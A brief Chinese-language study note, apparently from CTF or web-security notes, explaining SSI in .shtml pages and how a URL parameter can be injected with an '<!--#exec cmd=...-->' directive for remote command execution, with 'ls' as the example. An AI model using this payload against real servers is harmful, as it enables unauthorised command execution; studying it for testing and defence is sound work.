shtml是一种特殊的html。需要运行在支持SSI的服务器，如apache。简单来说就是能根据命令动态回显网页的某个部分，比如时间。
可以注入，用来远程命令执行。 格式：  
```
?username=<!--#exec cmd="命令"-->

?username=<!--#exec cmd="ls"-->
```